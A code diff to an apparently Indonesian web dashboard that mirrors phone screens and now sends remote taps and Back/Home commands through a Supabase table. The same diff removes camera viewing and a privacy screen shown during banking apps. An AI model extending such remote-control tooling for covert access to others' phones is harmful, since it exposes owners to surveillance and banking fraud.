@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security & Device Remote Monitor</title>
+    <title>Device Remote Monitor & Control</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -39,6 +39,7 @@
         .view-frame {
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
             aspect-ratio: 9/16;
+            cursor: crosshair;
         }
     </style>
 </head>
@@ -49,16 +50,16 @@
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
             <div class="flex items-center gap-4">
                 <div class="p-3 bg-gradient-to-tr from-blue-600 to-indigo-600 text-white rounded-2xl shadow-lg shadow-blue-500/20">
-                    <i data-lucide="shield-alert" class="w-6 h-6"></i>
+                    <i data-lucide="smartphone" class="w-6 h-6"></i>
                 </div>
                 <div>
                     <h1 class="text-xl font-bold text-white tracking-tight flex items-center gap-2.5">
-                        Security & Remote Monitor
+                        Device Remote Monitor & Control
                         <span class="text-[10px] font-semibold px-2.5 py-0.5 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full flex items-center gap-1.5">
                             <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> HD Live
                         </span>
                     </h1>
-                    <p class="text-xs text-slate-400 mt-0.5">Pantau Layar & Kamera Perangkat secara Realtime & Aman</p>
+                    <p class="text-xs text-slate-400 mt-0.5">Pantau dan Kendalikan HP dari Jarak Jauh Realtime</p>
                 </div>
             </div>
 
@@ -94,23 +95,15 @@
             </button>
         </div>
 
-        <!-- Layout Grid: Left (Viewer) & Right (Status) -->
+        <!-- Layout Grid: Left (Viewer + Remote Control) & Right (Status) -->
         <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
 
-            <!-- Left Side: Live Stream Viewer (Col 7) -->
+            <!-- Left Side: Live Stream Viewer & Controller (Col 7) -->
             <div class="lg:col-span-7 glass-card rounded-3xl p-6 shadow-2xl space-y-5">
                 <div class="flex flex-wrap items-center justify-between border-b border-slate-800/80 pb-4 gap-3">
-                    <!-- Mode Switcher Tabs -->
-                    <div class="flex items-center gap-1.5 bg-dark-900 p-1.5 rounded-2xl border border-slate-800/80">
-                        <button onclick="switchViewMode('screen')" id="tabScreen" class="px-3.5 py-2 text-xs font-semibold rounded-xl bg-blue-600 text-white transition flex items-center gap-2 shadow-sm">
-                            <i data-lucide="smartphone" class="w-4 h-4"></i> Layar HP
-                        </button>
-                        <button onclick="switchViewMode('front')" id="tabFront" class="px-3.5 py-2 text-xs font-semibold rounded-xl text-slate-400 hover:text-white transition flex items-center gap-2">
-                            <i data-lucide="camera" class="w-4 h-4"></i> Kamera Depan
-                        </button>
-                        <button onclick="switchViewMode('back')" id="tabBack" class="px-3.5 py-2 text-xs font-semibold rounded-xl text-slate-400 hover:text-white transition flex items-center gap-2">
-                            <i data-lucide="camera-off" class="w-4 h-4"></i> Kamera Belakang
-                        </button>
+                    <div class="flex items-center gap-2">
+                        <div class="w-3 h-3 rounded-full bg-emerald-400 animate-pulse"></div>
+                        <h2 class="text-sm font-bold text-white tracking-wide">Live Screen Mirroring & Control</h2>
                     </div>
 
                     <!-- Remote Control Toggle -->
@@ -133,25 +126,19 @@
                             <p class="text-[11px] text-slate-500 leading-relaxed">Tekan tombol <b>"Mulai Stream (ON)"</b> untuk menyiarkan tayangan live.</p>
                         </div>
 
-                        <!-- Loading State -->
-                        <div id="loadingPlaceholder" class="hidden p-6 text-center text-slate-400 space-y-3">
-                            <div class="w-10 h-10 border-3 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto"></div>
-                            <p class="text-xs font-bold text-slate-200">Menghubungkan Perangkat...</p>
-                            <p class="text-[10px] text-slate-500">Menunggu frame pertama dari HP.</p>
-                        </div>
-
-                        <!-- Privacy Mode State (M-Banking Active) -->
-                        <div id="privacyPlaceholder" class="hidden p-6 text-center text-slate-300 space-y-3 bg-dark-900 z-20">
-                            <div class="w-16 h-16 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400">
-                                <i data-lucide="lock" class="w-7 h-7"></i>
-                            </div>
-                            <p class="text-xs font-bold text-amber-200">Mode Privasi Aktif</p>
-                            <p class="text-[11px] text-slate-400 leading-relaxed">Perangkat sedang membuka aplikasi M-Banking. Layar disembunyikan untuk keamanan transaksi.</p>
-                        </div>
-
-                        <!-- Live Feed Image -->
-                        <img id="liveStreamImage" src="" alt="Live Feed" class="hidden w-full h-full object-contain z-10 bg-black">
+                        <!-- Live Feed Image (Clickable for Remote Tap) -->
+                        <img id="liveStreamImage" src="" alt="Live Screen" onclick="handleScreenClick(event)" class="hidden w-full h-full object-contain z-10 bg-black">
                     </div>
+                </div>
+
+                <!-- Remote Hardware Buttons (Home, Back) -->
+                <div class="flex items-center justify-center gap-4 pt-2">
+                    <button onclick="sendRemoteAction('back')" class="px-5 py-2.5 bg-dark-800 hover:bg-dark-700 text-slate-200 rounded-xl border border-slate-700 flex items-center gap-2 text-xs font-semibold transition shadow-sm">
+                        <i data-lucide="arrow-left" class="w-4 h-4 text-blue-400"></i> Kembali (Back)
+                    </button>
+                    <button onclick="sendRemoteAction('home')" class="px-5 py-2.5 bg-dark-800 hover:bg-dark-700 text-slate-200 rounded-xl border border-slate-700 flex items-center gap-2 text-xs font-semibold transition shadow-sm">
+                        <i data-lucide="home" class="w-4 h-4 text-emerald-400"></i> Beranda (Home)
+                    </button>
                 </div>
 
                 <div class="flex items-center justify-between text-xs text-slate-400 pt-1">
@@ -238,7 +225,6 @@
         let supabaseClient = null;
         let devicesData = {};
         let activeDeviceId = null;
-        let currentViewMode = 'screen'; // 'screen', 'front', 'back'
         let isStreamActive = false;
 
         document.addEventListener('DOMContentLoaded', () => {
@@ -261,25 +247,39 @@
             }
         }
 
-        function switchViewMode(mode) {
-            currentViewMode = mode;
-            document.getElementById('tabScreen').className = `px-3.5 py-2 text-xs font-semibold rounded-xl transition flex items-center gap-2 ${mode === 'screen' ? 'bg-blue-600 text-white shadow-sm' : 'text-slate-400 hover:text-white'}`;
-            document.getElementById('tabFront').className = `px-3.5 py-2 text-xs font-semibold rounded-xl transition flex items-center gap-2 ${mode === 'front' ? 'bg-blue-600 text-white shadow-sm' : 'text-slate-400 hover:text-white'}`;
-            document.getElementById('tabBack').className = `px-3.5 py-2 text-xs font-semibold rounded-xl transition flex items-center gap-2 ${mode === 'back' ? 'bg-blue-600 text-white shadow-sm' : 'text-slate-400 hover:text-white'}`;
-
-            if (mode === 'front' || mode === 'back') {
-                updateCameraCommand(true, mode);
-            } else {
-                updateCameraCommand(false, 'back');
-            }
-            renderDevices();
-        }
-
-        async function updateCameraCommand(active, facing) {
+        async function handleScreenClick(event) {
             if (!supabaseClient || !activeDeviceId) return;
+            const img = event.target;
+            const rect = img.getBoundingClientRect();
+
+            const clickX = event.clientX - rect.left;
+            const clickY = event.clientY - rect.top;
+
+            // Map UI coordinates to absolute screen coordinates (assuming standard phone resolution ~1080x1920 or scaled)
+            const naturalWidth = img.naturalWidth || 720;
+            const naturalHeight = img.naturalHeight || 1280;
+
+            const absX = (clickX / rect.width) * naturalWidth;
+            const absY = (clickY / rect.height) * naturalHeight;
+
+            const actionStr = `tap:${Math.round(absX)},${Math.round(absY)}`;
+            const actionId = 'action_' + Date.now();
+
             await supabaseClient
                 .from('devices')
-                .update({ is_camera_active: active, camera_facing: facing, is_mirroring_enabled: !active })
+                .update({ remote_action: actionStr, remote_action_id: actionId })
+                .eq('id', activeDeviceId);
+        }
+
+        async function sendRemoteAction(actionType) {
+            if (!supabaseClient || !activeDeviceId) {
+                alert('Pilih perangkat terlebih dahulu!');
+                return;
+            }
+            const actionId = 'action_' + Date.now();
+            await supabaseClient
+                .from('devices')
+                .update({ remote_action: actionType, remote_action_id: actionId })
                 .eq('id', activeDeviceId);
         }
 
@@ -353,13 +353,9 @@
             btn.disabled = true;
             btn.classList.add('opacity-50');
 
-            const updatePayload = currentViewMode === 'screen'
-                ? { is_mirroring_enabled: newState, is_camera_active: false }
-                : { is_camera_active: newState, camera_facing: currentViewMode, is_mirroring_enabled: false };
-
             const { error } = await supabaseClient
                 .from('devices')
-                .update(updatePayload)
+                .update({ is_mirroring_enabled: newState })
                 .eq('id', activeDeviceId);
 
             btn.disabled = false;
@@ -405,57 +401,27 @@
 
             const activeDevice = devices[0];
             activeDeviceId = activeDevice.id;
-
-            const isPrivacyMode = activeDevice.current_app_name && activeDevice.current_app_name.includes('Privasi Aktif');
-
-            let imageSrc = "";
-            if (currentViewMode === 'screen') {
-                isStreamActive = !!activeDevice.is_mirroring_enabled;
-                imageSrc = activeDevice.screen_image;
-            } else if (currentViewMode === 'front') {
-                isStreamActive = !!activeDevice.is_camera_active;
-                imageSrc = activeDevice.front_camera_image;
-            } else if (currentViewMode === 'back') {
-                isStreamActive = !!activeDevice.is_camera_active;
-                imageSrc = activeDevice.back_camera_image;
-            }
+            isStreamActive = !!activeDevice.is_mirroring_enabled;
 
             updateStreamUIState(isStreamActive);
 
             const streamImg = document.getElementById('liveStreamImage');
             const placeholder = document.getElementById('noStreamPlaceholder');
-            const loading = document.getElementById('loadingPlaceholder');
-            const privacy = document.getElementById('privacyPlaceholder');
 
-            if (isPrivacyMode) {
-                streamImg.classList.add('hidden');
-                loading.classList.add('hidden');
-                placeholder.classList.add('hidden');
-                privacy.classList.remove('hidden');
-            } else if (isStreamActive && imageSrc) {
-                streamImg.src = imageSrc;
+            if (isStreamActive && activeDevice.screen_image) {
+                streamImg.src = activeDevice.screen_image;
                 streamImg.classList.remove('hidden');
                 placeholder.classList.add('hidden');
-                loading.classList.add('hidden');
-                privacy.classList.add('hidden');
 
                 document.getElementById('streamUpdateTime').innerText = `Sync: ${formatDate(activeDevice.last_updated)}`;
-            } else if (isStreamActive) {
-                streamImg.classList.add('hidden');
-                placeholder.classList.add('hidden');
-                privacy.classList.add('hidden');
-                loading.classList.remove('hidden');
             } else {
                 streamImg.classList.add('hidden');
-                loading.classList.add('hidden');
-                privacy.classList.add('hidden');
                 placeholder.classList.remove('hidden');
             }
 
             grid.innerHTML = devices.map(device => {
                 const isOnline = checkIsOnline(device.last_updated);
                 const batteryPct = device.battery_level >= 0 ? `${device.battery_level}%` : 'N/A';
-                const isPriv = device.current_app_name && device.current_app_name.includes('Privasi Aktif');
 
                 return `
                     <div class="glass-card rounded-2xl p-5 relative overflow-hidden transition hover:border-slate-700">
@@ -493,9 +459,9 @@
 
                             <div class="flex items-center justify-between">
                                 <span class="text-slate-400 flex items-center gap-1.5">
-                                    <i data-lucide="app-window" class="w-3.5 h-3.5 text-purple-400"></i> Status App
+                                    <i data-lucide="app-window" class="w-3.5 h-3.5 text-purple-400"></i> Aplikasi Aktif
                                 </span>
-                                <span class="font-semibold ${isPriv ? 'text-amber-400 animate-pulse' : 'text-purple-300'} truncate max-w-[150px]">${escapeHtml(device.current_app_name || 'Utama')}</span>
+                                <span class="font-semibold text-purple-300 truncate max-w-[150px]">${escapeHtml(device.current_app_name || 'Utama')}</span>
                             </div>
                         </div>
 
